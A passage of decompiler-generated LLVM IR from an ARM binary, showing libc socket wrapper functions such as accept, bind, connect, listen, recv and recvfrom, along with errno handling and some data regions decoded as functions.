  %v0_11cf4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11cf4 = sub i32 0, %v0_11cf4
  store i32 %v1_11cf4, i32* %r2.global-to-local, align 4
  %v3_11cf8 = add i32 %v4_11cf0, %v0_11cec
  %v4_11cf8 = inttoptr i32 %v3_11cf8 to i32*
  store i32 %v1_11cf4, i32* %v4_11cf8, align 4
  %v2_11d00.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11d00

dec_label_pc_11d00:                               ; preds = %entry, %dec_label_pc_11ce8
  %v1_11d04 = phi i32 [ %v0_11cd8, %entry ], [ -1, %dec_label_pc_11ce8 ]
  %v2_11d00 = phi i32 [ %v3_11ccc, %entry ], [ %v2_11d00.pre, %dec_label_pc_11ce8 ]
  store i32 %v2_11d00, i32* @r7, align 4
  ret i32 %v1_11d04

; uselistorder directives
  uselistorder i32 %v0_11cd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11d00, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11d08:
  %v0_11d08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11d08, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11d08
  %v2_11d0c = load i32, i32* @r4, align 4
  %v3_11d0c = udiv i32 %v2_11d0c, 1024
  %v4_11d0c = mul i32 %v2_11d0c, 4194304
  %v5_11d0c = or i32 %v3_11d0c, %v4_11d0c
  %v8_11d0c = and i32 %v5_11d0c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11d08, %bb
  %v9_11d0c = phi i32 [ %arg1, %dec_label_pc_11d08 ], [ %v8_11d0c, %bb ]
  ret i32 %v9_11d0c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_11d14 = load i32, i32* @r4, align 4
  %v9_11d14 = load i32, i32* @r6, align 4
  %v12_11d14 = load i32, i32* @r7, align 4
  %v4_11d20 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 12824) to i32*), align 4
  %v2_11d24 = icmp eq i32 %v4_11d20, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11d24, label %dec_label_pc_11d3c, label %entry.dec_label_pc_11d48_crit_edge

entry.dec_label_pc_11d48_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11d48

dec_label_pc_11d3c:                               ; preds = %entry
  store i32 %v3_11d14, i32* @r4, align 4
  store i32 %v9_11d14, i32* @r6, align 4
  store i32 %v12_11d14, i32* @r7, align 4
  %v0_11d44 = call i32 @__sys_accept()
  br label %dec_label_pc_11d48

dec_label_pc_11d48:                               ; preds = %entry.dec_label_pc_11d48_crit_edge, %dec_label_pc_11d3c
  %v0_11d48 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11d48, i32* @r5, align 4
  %v0_11d58 = load i32, i32* @r4, align 4
  store i32 %v0_11d58, i32* @r0, align 4
  %v0_11d5c = call i32 @__sys_accept()
  store i32 %v0_11d5c, i32* @r4, align 4
  %v0_11d64 = load i32, i32* @r5, align 4
  %v1_11d68 = call i32 @__libc_disable_asynccancel(i32 %v0_11d64)
  %v0_11d6c = load i32, i32* @r4, align 4
  store i32 %v12_11d14, i32* @r7, align 4
  ret i32 %v0_11d6c

; uselistorder directives
  uselistorder label %dec_label_pc_11d48, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11d84 = load i32, i32* @r7, align 4
  store i32 %v3_11d84, i32* %stack_var_-8, align 4
  %v0_11d90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11d90, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d90, -4095
  br i1 %tmp, label %dec_label_pc_11db8, label %dec_label_pc_11da0

dec_label_pc_11da0:                               ; preds = %entry
  %v0_11da4 = call i32 @__aeabi_read_tp()
  %v3_11da8 = load i16, i16* @global_var_2225c.361, align 2
  %v4_11da8 = sext i16 %v3_11da8 to i32
  %v0_11dac = load i32, i32* %r2.global-to-local, align 4
  %v1_11dac = sub i32 0, %v0_11dac
  store i32 %v1_11dac, i32* %r2.global-to-local, align 4
  %v3_11db0 = add i32 %v4_11da8, %v0_11da4
  %v4_11db0 = inttoptr i32 %v3_11db0 to i32*
  store i32 %v1_11dac, i32* %v4_11db0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11db8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11db8

dec_label_pc_11db8:                               ; preds = %entry, %dec_label_pc_11da0
  %v1_11dbc = phi i32 [ %v0_11d90, %entry ], [ -1, %dec_label_pc_11da0 ]
  %v2_11db8 = phi i32 [ %v3_11d84, %entry ], [ %v2_11db8.pre, %dec_label_pc_11da0 ]
  store i32 %v2_11db8, i32* @r7, align 4
  ret i32 %v1_11dbc

; uselistorder directives
  uselistorder i32 %v0_11d90, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11db8, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11dc0:
  %v0_11dc0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11dc0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11dc0
  %v2_11dc4 = load i32, i32* @ip, align 4
  %v5_11dc4 = udiv i32 %v2_11dc4, 512
  %v6_11dc4 = and i32 %v5_11dc4, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11dc0, %bb
  %v7_11dc4 = phi i32 [ %arg1, %dec_label_pc_11dc0 ], [ %v6_11dc4, %bb ]
  ret i32 %v7_11dc4

; uselistorder directives
  uselistorder i32 512, { 0, 8, 5, 1, 2, 9, 6, 10, 7, 11, 3, 12, 4, 13 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11dc8 = load i32, i32* @r7, align 4
  store i32 %v3_11dc8, i32* %stack_var_-8, align 4
  %v0_11dd4 = load i32, i32* @r0, align 4
  store i32 %v0_11dd4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11dd4, -4095
  br i1 %tmp, label %dec_label_pc_11dfc, label %dec_label_pc_11de4

dec_label_pc_11de4:                               ; preds = %entry
  %v0_11de8 = call i32 @__aeabi_read_tp()
  %v3_11dec = load i16, i16* @global_var_2225c.361, align 2
  %v4_11dec = sext i16 %v3_11dec to i32
  store i32 %v4_11dec, i32* @r3, align 4
  %v0_11df0 = load i32, i32* %r2.global-to-local, align 4
  %v1_11df0 = sub i32 0, %v0_11df0
  store i32 %v1_11df0, i32* %r2.global-to-local, align 4
  %v3_11df4 = add i32 %v4_11dec, %v0_11de8
  %v4_11df4 = inttoptr i32 %v3_11df4 to i32*
  store i32 %v1_11df0, i32* %v4_11df4, align 4
  %v2_11dfc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11dfc

dec_label_pc_11dfc:                               ; preds = %entry, %dec_label_pc_11de4
  %v1_11e00 = phi i32 [ %v0_11dd4, %entry ], [ -1, %dec_label_pc_11de4 ]
  %v2_11dfc = phi i32 [ %v3_11dc8, %entry ], [ %v2_11dfc.pre, %dec_label_pc_11de4 ]
  store i32 %v2_11dfc, i32* @r7, align 4
  ret i32 %v1_11e00

; uselistorder directives
  uselistorder i32 %v0_11dd4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11dfc, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11e04:
  %v0_11e04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e04, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11e04
  %v2_11e08 = load i32, i32* @r8, align 4
  %v3_11e08 = udiv i32 %v2_11e08, 256
  %v4_11e08 = mul i32 %v2_11e08, 16777216
  %v5_11e08 = or i32 %v3_11e08, %v4_11e08
  %v8_11e08 = and i32 %v5_11e08, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11e04, %bb
  %v9_11e08 = phi i32 [ %arg1, %dec_label_pc_11e04 ], [ %v8_11e08, %bb ]
  ret i32 %v9_11e08

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11e10 = load i32, i32* @r4, align 4
  store i32 %v3_11e10, i32* %stack_var_-20, align 4
  %v6_11e10 = load i32, i32* @r5, align 4
  %v9_11e10 = load i32, i32* @r6, align 4
  %v12_11e10 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r3, align 4
  %v4_11e1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 12824) to i32*), align 4
  store i32 %v4_11e1c, i32* @ip, align 4
  %v2_11e20 = icmp eq i32 %v4_11e1c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11e20, label %dec_label_pc_11e38, label %entry.dec_label_pc_11e44_crit_edge

entry.dec_label_pc_11e44_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11e44

dec_label_pc_11e38:                               ; preds = %entry
  store i32 %v3_11e10, i32* @r4, align 4
  store i32 %v9_11e10, i32* @r6, align 4
  store i32 %v12_11e10, i32* @r7, align 4
  %v0_11e40 = call i32 @__sys_connect()
  br label %dec_label_pc_11e44

dec_label_pc_11e44:                               ; preds = %entry.dec_label_pc_11e44_crit_edge, %dec_label_pc_11e38
  %v0_11e44 = call i32 @__libc_enable_asynccancel()
  %v0_11e48 = load i32, i32* @r6, align 4
  store i32 %v0_11e48, i32* @r1, align 4
  store i32 %v0_11e44, i32* @r5, align 4
  %v0_11e54 = load i32, i32* @r4, align 4
  store i32 %v0_11e54, i32* @r0, align 4
  %v0_11e58 = call i32 @__sys_connect()
  store i32 %v0_11e58, i32* @r4, align 4
  %v0_11e60 = load i32, i32* @r5, align 4
  %v1_11e64 = call i32 @__libc_disable_asynccancel(i32 %v0_11e60)
  %v0_11e68 = load i32, i32* @r4, align 4
  %v2_11e70 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11e70, i32* @r4, align 4
  store i32 %v6_11e10, i32* @r5, align 4
  store i32 %v9_11e10, i32* @r6, align 4
  store i32 %v12_11e10, i32* @r7, align 4
  ret i32 %v0_11e68

; uselistorder directives
  uselistorder label %dec_label_pc_11e44, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11e80 = load i32, i32* @r7, align 4
  store i32 %v3_11e80, i32* %stack_var_-8, align 4
  %v0_11e8c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11e8c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11e8c, -4095
  br i1 %tmp, label %dec_label_pc_11eb4, label %dec_label_pc_11e9c

dec_label_pc_11e9c:                               ; preds = %entry
  %v0_11ea0 = call i32 @__aeabi_read_tp()
  %v3_11ea4 = load i16, i16* @global_var_2225c.361, align 2
  %v4_11ea4 = sext i16 %v3_11ea4 to i32
  %v0_11ea8 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ea8 = sub i32 0, %v0_11ea8
  store i32 %v1_11ea8, i32* %r2.global-to-local, align 4
  %v3_11eac = add i32 %v4_11ea4, %v0_11ea0
  %v4_11eac = inttoptr i32 %v3_11eac to i32*
  store i32 %v1_11ea8, i32* %v4_11eac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11eb4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11eb4

dec_label_pc_11eb4:                               ; preds = %entry, %dec_label_pc_11e9c
  %v1_11eb8 = phi i32 [ %v0_11e8c, %entry ], [ -1, %dec_label_pc_11e9c ]
  %v2_11eb4 = phi i32 [ %v3_11e80, %entry ], [ %v2_11eb4.pre, %dec_label_pc_11e9c ]
  store i32 %v2_11eb4, i32* @r7, align 4
  ret i32 %v1_11eb8

; uselistorder directives
  uselistorder i32 %v0_11e8c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11eb4, { 1, 0 }
}

define i32 @"$d.5"(i16 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11ebc:
  %r0.global-to-local = alloca i32, align 4
  %tmp = sext i16 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_11ebc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11ebc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11ebc
  %tmp2 = inttoptr i32 %arg2 to i16*
  %v2_11ebc = load i32, i32* @lr, align 4
  %v9_11ebc = shl i32 %v2_11ebc, %arg2
  %v10_11ebc = and i32 %v9_11ebc, %tmp
  store i32 %v10_11ebc, i32* %r0.global-to-local, align 4
  %v2_11ec0 = trunc i32 %v10_11ebc to i16
  store i16 %v2_11ec0, i16* %tmp2, align 2
  %v6_11ec0 = load i32, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11ebc, %bb
  %v10_11ec0 = phi i32 [ %tmp, %dec_label_pc_11ebc ], [ %v6_11ec0, %bb ]
  ret i32 %v10_11ec0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11ec4 = load i32, i32* @r4, align 4
  store i32 %v3_11ec4, i32* %stack_var_-12, align 4
  %v0_11ed4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11ed4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11ed4, -4095
  br i1 %tmp, label %dec_label_pc_11efc, label %dec_label_pc_11ee4

dec_label_pc_11ee4:                               ; preds = %entry
  %v0_11ee8 = call i32 @__aeabi_read_tp()
  %v3_11eec = load i16, i16* @global_var_2225c.361, align 2
  %v4_11eec = sext i16 %v3_11eec to i32
  %v0_11ef0 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ef0 = sub i32 0, %v0_11ef0
  store i32 %v1_11ef0, i32* %r2.global-to-local, align 4
  %v3_11ef4 = add i32 %v4_11eec, %v0_11ee8
  %v4_11ef4 = inttoptr i32 %v3_11ef4 to i32*
  store i32 %v1_11ef0, i32* %v4_11ef4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11efc.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11efc

dec_label_pc_11efc:                               ; preds = %entry, %dec_label_pc_11ee4
  %v1_11f00 = phi i32 [ %v0_11ed4, %entry ], [ -1, %dec_label_pc_11ee4 ]
  %v2_11efc = phi i32 [ %v3_11ec4, %entry ], [ %v2_11efc.pre, %dec_label_pc_11ee4 ]
  store i32 %v2_11efc, i32* @r4, align 4
  ret i32 %v1_11f00

; uselistorder directives
  uselistorder i32 %v0_11ed4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11efc, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11f04:
  %v0_11f04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11f04, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11f04
  %v2_11f08 = load i32, i32* @r8, align 4
  %v3_11f08 = udiv i32 %v2_11f08, 64
  %v4_11f08 = mul i32 %v2_11f08, 67108864
  %v5_11f08 = or i32 %v3_11f08, %v4_11f08
  %v8_11f08 = and i32 %v5_11f08, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11f04, %bb
  %v9_11f08 = phi i32 [ %arg1, %dec_label_pc_11f04 ], [ %v8_11f08, %bb ]
  ret i32 %v9_11f08

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11f0c = load i32, i32* @r7, align 4
  store i32 %v3_11f0c, i32* %stack_var_-8, align 4
  %v0_11f18 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11f18, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11f18, -4095
  br i1 %tmp, label %dec_label_pc_11f40, label %dec_label_pc_11f28

dec_label_pc_11f28:                               ; preds = %entry
  %v0_11f2c = call i32 @__aeabi_read_tp()
  %v3_11f30 = load i16, i16* @global_var_2225c.361, align 2
  %v4_11f30 = sext i16 %v3_11f30 to i32
  %v0_11f34 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f34 = sub i32 0, %v0_11f34
  store i32 %v1_11f34, i32* %r2.global-to-local, align 4
  %v3_11f38 = add i32 %v4_11f30, %v0_11f2c
  %v4_11f38 = inttoptr i32 %v3_11f38 to i32*
  store i32 %v1_11f34, i32* %v4_11f38, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11f40.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11f40

dec_label_pc_11f40:                               ; preds = %entry, %dec_label_pc_11f28
  %v1_11f44 = phi i32 [ %v0_11f18, %entry ], [ -1, %dec_label_pc_11f28 ]
  %v2_11f40 = phi i32 [ %v3_11f0c, %entry ], [ %v2_11f40.pre, %dec_label_pc_11f28 ]
  store i32 %v2_11f40, i32* @r7, align 4
  ret i32 %v1_11f44

; uselistorder directives
  uselistorder i32 %v0_11f18, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f40, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11f4c = load i32, i32* @r7, align 4
  store i32 %v3_11f4c, i32* %stack_var_-8, align 4
  %v0_11f58 = load i32, i32* @r0, align 4
  store i32 %v0_11f58, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11f58, -4095
  br i1 %tmp, label %dec_label_pc_11f80, label %dec_label_pc_11f68

dec_label_pc_11f68:                               ; preds = %entry
  %v0_11f6c = call i32 @__aeabi_read_tp()
  %v3_11f70 = load i16, i16* @global_var_2225c.361, align 2
  %v4_11f70 = sext i16 %v3_11f70 to i32
  %v0_11f74 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f74 = sub i32 0, %v0_11f74
  store i32 %v1_11f74, i32* %r2.global-to-local, align 4
  %v3_11f78 = add i32 %v4_11f70, %v0_11f6c
  %v4_11f78 = inttoptr i32 %v3_11f78 to i32*
  store i32 %v1_11f74, i32* %v4_11f78, align 4
  %v2_11f80.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11f80

dec_label_pc_11f80:                               ; preds = %entry, %dec_label_pc_11f68
  %v1_11f84 = phi i32 [ %v0_11f58, %entry ], [ -1, %dec_label_pc_11f68 ]
  %v2_11f80 = phi i32 [ %v3_11f4c, %entry ], [ %v2_11f80.pre, %dec_label_pc_11f68 ]
  store i32 %v2_11f80, i32* @r7, align 4
  ret i32 %v1_11f84

; uselistorder directives
  uselistorder i32 %v0_11f58, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11f80, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11f88:
  %v0_11f88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11f88, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11f88
  %v2_11f8c = load i32, i32* @r4, align 4
  %v3_11f8c = udiv i32 %v2_11f8c, 32
  %v4_11f8c = mul i32 %v2_11f8c, 134217728
  %v5_11f8c = or i32 %v3_11f8c, %v4_11f8c
  %v8_11f8c = and i32 %v5_11f8c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11f88, %bb
  %v9_11f8c = phi i32 [ %arg1, %dec_label_pc_11f88 ], [ %v8_11f8c, %bb ]
  ret i32 %v9_11f8c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11f94 = load i32, i32* @r4, align 4
  store i32 %v3_11f94, i32* %stack_var_-24, align 4
  %v6_11f94 = load i32, i32* @r5, align 4
  %v9_11f94 = load i32, i32* @r6, align 4
  %v12_11f94 = load i32, i32* @r7, align 4
  %v15_11f94 = load i32, i32* @r8, align 4
  %v18_11f94 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @ip, align 4
  %v4_11fa0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 12824) to i32*), align 4
  %v2_11fa4 = icmp eq i32 %v4_11fa0, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_11fa4, label %dec_label_pc_11fbc, label %entry.dec_label_pc_11fc4_crit_edge

entry.dec_label_pc_11fc4_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11fc4

dec_label_pc_11fbc:                               ; preds = %entry
  store i32 %v3_11f94, i32* @r4, align 4
  store i32 %v9_11f94, i32* @r6, align 4
  store i32 %v12_11f94, i32* @r7, align 4
  store i32 %v15_11f94, i32* @r8, align 4
  %v0_11fc0 = call i32 @__sys_recv()
  br label %dec_label_pc_11fc4

dec_label_pc_11fc4:                               ; preds = %entry.dec_label_pc_11fc4_crit_edge, %dec_label_pc_11fbc
  %v0_11fc4 = call i32 @__libc_enable_asynccancel()
  %v0_11fc8 = load i32, i32* @r6, align 4
  store i32 %v0_11fc8, i32* @r1, align 4
  store i32 %v0_11fc4, i32* @r5, align 4
  %v0_11fd8 = load i32, i32* @r4, align 4
  store i32 %v0_11fd8, i32* @r0, align 4
  %v0_11fdc = call i32 @__sys_recv()
  store i32 %v0_11fdc, i32* @r4, align 4
  %v0_11fe4 = load i32, i32* @r5, align 4
  %v1_11fe8 = call i32 @__libc_disable_asynccancel(i32 %v0_11fe4)
  %v0_11fec = load i32, i32* @r4, align 4
  %v2_11ff0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11ff0, i32* @r4, align 4
  store i32 %v6_11f94, i32* @r5, align 4
  store i32 %v9_11f94, i32* @r6, align 4
  store i32 %v12_11f94, i32* @r7, align 4
  store i32 %v15_11f94, i32* @r8, align 4
  store i32 %v18_11f94, i32* @lr, align 4
  ret i32 %v0_11fec

; uselistorder directives
  uselistorder label %dec_label_pc_11fc4, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12000 = load i32, i32* @r4, align 4
  store i32 %v3_12000, i32* %stack_var_-16, align 4
  %v0_12014 = load i32, i32* @r0, align 4
  store i32 %v0_12014, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12014, -4095
  br i1 %tmp, label %dec_label_pc_1203c, label %dec_label_pc_12024

dec_label_pc_12024:                               ; preds = %entry
  %v0_12028 = call i32 @__aeabi_read_tp()
  %v3_1202c = load i16, i16* @global_var_2225c.361, align 2
  %v4_1202c = sext i16 %v3_1202c to i32
  %v0_12030 = load i32, i32* %r2.global-to-local, align 4
  %v1_12030 = sub i32 0, %v0_12030
  store i32 %v1_12030, i32* %r2.global-to-local, align 4
  %v3_12034 = add i32 %v4_1202c, %v0_12028
  %v4_12034 = inttoptr i32 %v3_12034 to i32*
  store i32 %v1_12030, i32* %v4_12034, align 4
  %v2_1203c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1203c

dec_label_pc_1203c:                               ; preds = %entry, %dec_label_pc_12024
  %v1_12040 = phi i32 [ %v0_12014, %entry ], [ -1, %dec_label_pc_12024 ]
  %v2_1203c = phi i32 [ %v3_12000, %entry ], [ %v2_1203c.pre, %dec_label_pc_12024 ]
  store i32 %v2_1203c, i32* @r4, align 4
  ret i32 %v1_12040

; uselistorder directives
  uselistorder i32 %v0_12014, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1203c, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12048 = load i32, i32* @r4, align 4
  store i32 %v3_12048, i32* %stack_var_-32, align 4
  %v6_12048 = load i32, i32* @r5, align 4
  %v9_12048 = load i32, i32* @r6, align 4
  %v12_12048 = load i32, i32* @r7, align 4
  %v15_12048 = load i32, i32* @r8, align 4
  %v18_12048 = load i32, i32* @sb, align 4
  %v21_12048 = load i32, i32* @sl, align 4
  %v24_12048 = load i32, i32* @lr, align 4
  %v4_12058 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 12824) to i32*), align 4
  %v2_12060 = icmp eq i32 %v4_12058, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_12060, label %dec_label_pc_12080, label %dec_label_pc_1208c

dec_label_pc_12080:                               ; preds = %entry
  store i32 %v3_12048, i32* @r4, align 4
  store i32 %v12_12048, i32* @r7, align 4
  store i32 %v15_12048, i32* @r8, align 4
  store i32 %v18_12048, i32* %sb.global-to-local, align 4
  %v0_12088 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_1208c

dec_label_pc_1208c:                               ; preds = %entry, %dec_label_pc_12080
  %v0_1208c = call i32 @__libc_enable_asynccancel()
  %v0_12090 = load i32, i32* @r7, align 4
  store i32 %v0_12090, i32* @r1, align 4
  store i32 %v0_1208c, i32* @r5, align 4
  %v0_120a0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_120a0, i32* @r0, align 4
  %v0_120a8 = call i32 @__sys_recvfrom()
  store i32 %v0_120a8, i32* @r4, align 4
  %v0_120b0 = load i32, i32* @r5, align 4
  %v1_120b4 = call i32 @__libc_disable_asynccancel(i32 %v0_120b0)
  %v0_120b8 = load i32, i32* @r4, align 4
  %v2_120c0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_120c0, i32* @r4, align 4
  store i32 %v6_12048, i32* @r5, align 4
  store i32 %v9_12048, i32* @r6, align 4
  store i32 %v12_12048, i32* @r7, align 4
  store i32 %v15_12048, i32* @r8, align 4
  store i32 %v18_12048, i32* @sb, align 4
  store i32 %v21_12048, i32* @sl, align 4
  store i32 %v24_12048, i32* @lr, align 4
  ret i32 %v0_120b8

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1208c, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_120d0 = load i32, i32* @r7, align 4
  store i32 %v3_120d0, i32* %stack_var_-8, align 4
  %v0_120dc = load i32, i32* @r0, align 4
  store i32 %v0_120dc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_120dc, -4095
  br i1 %tmp, label %dec_label_pc_12104, label %dec_label_pc_120ec

dec_label_pc_120ec:                               ; preds = %entry
  %v0_120f0 = call i32 @__aeabi_read_tp()
  %v3_120f4 = load i16, i16* @global_var_2225c.361, align 2
  %v4_120f4 = sext i16 %v3_120f4 to i32
  store i32 %v4_120f4, i32* @r3, align 4
  %v0_120f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_120f8 = sub i32 0, %v0_120f8
  store i32 %v1_120f8, i32* %r2.global-to-local, align 4
  %v3_120fc = add i32 %v4_120f4, %v0_120f0
  %v4_120fc = inttoptr i32 %v3_120fc to i32*
  store i32 %v1_120f8, i32* %v4_120fc, align 4
  %v2_12104.pre = load i32, i32* %stack_var_-8, align 4
